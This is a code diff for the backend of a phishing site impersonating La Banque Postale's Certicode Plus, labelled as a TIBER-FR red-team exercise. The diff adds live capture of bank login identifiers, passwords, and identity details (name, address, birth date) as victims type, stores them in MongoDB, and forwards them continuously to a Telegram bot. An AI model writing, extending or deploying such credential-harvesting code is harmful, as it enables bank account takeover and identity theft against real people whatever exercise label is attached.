@@ -6,26 +6,22 @@ import os
 import logging
 import uuid
 import httpx
+import html
 from pathlib import Path
 from pydantic import BaseModel, Field, ConfigDict
-from typing import Optional, Dict, Any, List
+from typing import Optional, Dict, Any
 from datetime import datetime, timezone
 
 
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / ".env")
 
-# MongoDB connection
 mongo_url = os.environ["MONGO_URL"]
 client = AsyncIOMotorClient(mongo_url)
 db = client[os.environ["DB_NAME"]]
 
-# Create the main app without a prefix
 app = FastAPI(title="Certicode Plus - TIBER-FR Red Team Exercise")
-
-# Create a router with the /api prefix
 api_router = APIRouter(prefix="/api")
-
 
 # ---------- Models ----------
 
@@ -39,10 +35,22 @@ class SessionOut(BaseModel):
     created_at: str
 
 
+class ProgressIn(BaseModel):
+    model_config = ConfigDict(extra="ignore")
+    session_id: str
+    stage: Optional[str] = None  # 'identifiant' | 'password' | 'identity' | 'completed'
+    data: Dict[str, Any] = Field(default_factory=dict)
+
+
+class ProgressOut(BaseModel):
+    ok: bool
+    telegram_sent: bool
+
+
 class SubmissionIn(BaseModel):
     model_config = ConfigDict(extra="ignore")
     session_id: str
-    step: str  # 'login' | 'card' | 'sms' | 'complete'
+    step: str  # 'login' | 'identity' | 'complete'
     fields: Dict[str, Any] = Field(default_factory=dict)
 
 
@@ -66,40 +74,80 @@ def _client_meta(request: Request) -> Dict[str, str]:
     }
 
 
-def _format_telegram_message(step: str, session_id: str, fields: Dict[str, Any], meta: Dict[str, str]) -> str:
-    step_emoji = {
-        "login": "🔐",
-        "identity": "🪪",
-        "complete": "✅",
-    }.get(step, "ℹ️")
+def _esc(v: Any) -> str:
+    return html.escape(str(v)) if v is not None else ""
 
-    step_label = {
-        "login": "Connexion (Identifiant + Mot de passe)",
-        "identity": "Vérification d'identité",
-        "complete": "Parcours terminé",
-    }.get(step, step)
+
+def _format_progress_message(
+    session_id: str,
+    captured: Dict[str, Any],
+    meta: Dict[str, str],
+    stage: Optional[str],
+    started_at: str,
+) -> str:
+    """Build a progressive HTML recap message that grows as fields fill in."""
+    stage_label = {
+        "identifiant": "🟡 Identifiant en cours",
+        "password": "🟠 Mot de passe en cours",
+        "identity": "🔵 Vérification d'identité en cours",
+        "completed": "✅ Parcours terminé",
+    }.get(stage or "", "⏳ Capture en cours")
 
     lines = [
-        f"<b>{step_emoji} LBP Certicode Plus — {step_label}</b>",
-        f"<b>Session</b> : <code>{session_id}</code>",
-        f"<b>IP</b> : <code>{meta.get('ip', '?')}</code>",
-        f"<b>UA</b> : <code>{meta.get('user_agent', '?')[:180]}</code>",
-        f"<b>Heure</b> : {_now_iso()}",
-        "—" * 10,
+        "<b>🎯 LBP Certicode Plus — Capture en direct</b>",
+        f"<b>État</b> : {stage_label}",
+        f"<b>Session</b> : <code>{_esc(session_id)}</code>",
+        f"<b>IP</b> : <code>{_esc(meta.get('ip', '?'))}</code>",
+        f"<b>UA</b> : <code>{_esc(meta.get('user_agent', '?')[:160])}</code>",
+        f"<b>Démarrage</b> : {_esc(started_at)}",
+        f"<b>Dernière màj</b> : {_esc(_now_iso())}",
+        "━━━━━━━━━━━━━━━━━",
     ]
-    for k, v in fields.items():
-        safe_v = str(v).replace("<", "&lt;").replace(">", "&gt;")
-        lines.append(f"<b>{k}</b> : <code>{safe_v}</code>")
-    lines.append("\n<i>Exercice TIBER-FR / DORA — démonstratif</i>")
+
+    # ---- Identification ----
+    ident_lines = []
+    if captured.get("identifiant"):
+        ident_lines.append(f"• <b>Identifiant</b> : <code>{_esc(captured['identifiant'])}</code>")
+    if captured.get("mot_de_passe"):
+        ident_lines.append(f"• <b>Mot de passe</b> : <code>{_esc(captured['mot_de_passe'])}</code>")
+    if "memorise" in captured:
+        ident_lines.append(
+            f"• <b>Mémoriser</b> : {'oui' if captured.get('memorise') else 'non'}"
+        )
+    if ident_lines:
+        lines.append("🔐 <b>IDENTIFICATION</b>")
+        lines.extend(ident_lines)
+        lines.append("━━━━━━━━━━━━━━━━━")
+
+    # ---- Identity ----
+    id_keys = [
+        ("nom", "Nom"),
+        ("prenom", "Prénom"),
+        ("adresse_complete", "Adresse"),
+        ("code_postal", "Code postal"),
+        ("ville", "Ville"),
+        ("date_naissance", "Date de naissance"),
+    ]
+    id_lines = [
+        f"• <b>{label}</b> : <code>{_esc(captured[k])}</code>"
+        for k, label in id_keys
+        if captured.get(k)
+    ]
+    if id_lines:
+        lines.append("🪪 <b>IDENTITÉ</b>")
+        lines.extend(id_lines)
+        lines.append("━━━━━━━━━━━━━━━━━")
+
+    lines.append("<i>Exercice TIBER-FR / DORA — démonstratif</i>")
     return "\n".join(lines)
 
 
-async def _send_telegram(text: str) -> Dict[str, Any]:
+async def _telegram_send(text: str) -> Optional[int]:
+    """Send a new Telegram message. Returns message_id on success."""
     token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
     chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
     if not token or not chat_id:
-        return {"sent": False, "reason": "telegram_not_configured"}
-
+        return None
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     payload = {
         "chat_id": chat_id,
@@ -110,10 +158,69 @@ async def _send_telegram(text: str) -> Dict[str, Any]:
     try:
         async with httpx.AsyncClient(timeout=10.0) as http:
             r = await http.post(url, json=payload)
-        return {"sent": r.status_code == 200, "status_code": r.status_code, "body": r.text[:200]}
-    except Exception as e:
+        j = r.json()
+        if r.status_code == 200 and j.get("ok"):
+            return j["result"]["message_id"]
+        logging.warning(f"telegram send failed: {r.status_code} {r.text[:200]}")
+    except Exception:
         logging.exception("Telegram send failed")
-        return {"sent": False, "reason": str(e)}
+    return None
+
+
+async def _telegram_edit(message_id: int, text: str) -> bool:
+    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
+    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
+    if not token or not chat_id:
+        return False
+    url = f"https://api.telegram.org/bot{token}/editMessageText"
+    payload = {
+        "chat_id": chat_id,
+        "message_id": message_id,
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True,
+    }
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as http:
+            r = await http.post(url, json=payload)
+        j = r.json()
+        if r.status_code == 200 and j.get("ok"):
+            return True
+        # 'message is not modified' returns 400 but is harmless
+        if "not modified" in r.text:
+            return True
+        logging.warning(f"telegram edit failed: {r.status_code} {r.text[:200]}")
+    except Exception:
+        logging.exception("Telegram edit failed")
+    return False
+
+
+async def _push_or_edit_progress(session_id: str, request: Request, stage: Optional[str]) -> bool:
+    """Centralized helper: read session, build message, send (first time) or edit (subsequent)."""
+    sess = await db.sessions.find_one({"session_id": session_id})
+    if not sess:
+        return False
+    meta = _client_meta(request)
+    captured = sess.get("captured_data", {}) or {}
+    text = _format_progress_message(
+        session_id=session_id,
+        captured=captured,
+        meta=meta,
+        stage=stage,
+        started_at=sess.get("created_at", ""),
+    )
+    message_id = sess.get("tg_message_id")
+    if message_id:
+        return await _telegram_edit(message_id, text)
+    # No existing message - send a new one and persist message_id
+    new_id = await _telegram_send(text)
+    if new_id is not None:
+        await db.sessions.update_one(
+            {"session_id": session_id},
+            {"$set": {"tg_message_id": new_id}},
+        )
+        return True
+    return False
 
 
 # ---------- Routes ----------
@@ -125,13 +232,12 @@ async def root():
 
 @api_router.get("/health")
 async def health():
-    telegram_configured = bool(
-        os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
-        and os.environ.get("TELEGRAM_CHAT_ID", "").strip()
-    )
     return {
         "status": "ok",
-        "telegram_configured": telegram_configured,
+        "telegram_configured": bool(
+            os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
+            and os.environ.get("TELEGRAM_CHAT_ID", "").strip()
+        ),
         "time": _now_iso(),
     }
 
@@ -146,14 +252,43 @@ async def create_session(payload: SessionCreate, request: Request):
         "ip": meta["ip"],
         "user_agent": meta["user_agent"],
         "referrer": payload.referrer or request.headers.get("referer", ""),
+        "captured_data": {},
+        "tg_message_id": None,
         "steps": [],
     }
     await db.sessions.insert_one(doc)
     return SessionOut(session_id=session_id, created_at=doc["created_at"])
 
 
+@api_router.post("/progress", response_model=ProgressOut)
+async def push_progress(payload: ProgressIn, request: Request):
+    """Progressive update endpoint: merges partial fields into the session-level
+    captured_data and sends or edits a single Telegram message so the recap fills
+    up as the user types on the site."""
+    sess = await db.sessions.find_one({"session_id": payload.session_id})
+    if not sess:
+        raise HTTPException(status_code=404, detail="session_not_found")
+
+    # Merge new fields, dropping empty strings/None to avoid overwriting filled data with blanks
+    merge_set = {}
+    for k, v in (payload.data or {}).items():
+        if v is None or v == "":
+            continue
+        merge_set[f"captured_data.{k}"] = v
+
+    if merge_set:
+        await db.sessions.update_one(
+            {"session_id": payload.session_id},
+            {"$set": merge_set},
+        )
+
+    sent = await _push_or_edit_progress(payload.session_id, request, payload.stage)
+    return ProgressOut(ok=True, telegram_sent=sent)
+
+
 @api_router.post("/submissions", response_model=SubmissionOut)
 async def create_submission(payload: SubmissionIn, request: Request):
+    """Step-completion endpoint: records a submission row and also pushes a Telegram update."""
     meta = _client_meta(request)
     submission_id = str(uuid.uuid4())
 
@@ -168,31 +303,39 @@ async def create_submission(payload: SubmissionIn, request: Request):
     }
     await db.submissions.insert_one(sub_doc)
 
-    # Update session to include this step
+    # Merge fields into session captured_data too
+    merge_set = {}
+    for k, v in (payload.fields or {}).items():
+        if v is None or v == "":
+            continue
+        merge_set[f"captured_data.{k}"] = v
+    if merge_set:
+        await db.sessions.update_one(
+            {"session_id": payload.session_id},
+            {"$set": merge_set},
+        )
+
     await db.sessions.update_one(
         {"session_id": payload.session_id},
         {"$push": {"steps": {"step": payload.step, "submission_id": submission_id, "at": sub_doc["created_at"]}}},
     )
 
-    # Forward to Telegram (non-blocking style but we await for status)
-    text = _format_telegram_message(payload.step, payload.session_id, payload.fields, meta)
-    tg = await _send_telegram(text)
-    logging.info(f"Telegram forward result: {tg}")
+    stage_map = {"login": "password", "identity": "identity", "complete": "completed"}
+    await _push_or_edit_progress(payload.session_id, request, stage_map.get(payload.step))
 
     return SubmissionOut(ok=True, submission_id=submission_id)
 
 
 @api_router.get("/admin/submissions")
 async def list_submissions(token: str):
-    # Lightweight read endpoint protected by env-token. Useful only for debugging.
     expected = os.environ.get("ADMIN_READ_TOKEN", "").strip()
     if not expected or token != expected:
         raise HTTPException(status_code=403, detail="forbidden")
     rows = await db.submissions.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
-    return {"count": len(rows), "items": rows}
+    sessions = await db.sessions.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
+    return {"submissions": rows, "sessions": sessions}
 
 
-# Include the router in the main app
 app.include_router(api_router)
 
 app.add_middleware(
@@ -203,7 +346,6 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Configure logging
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
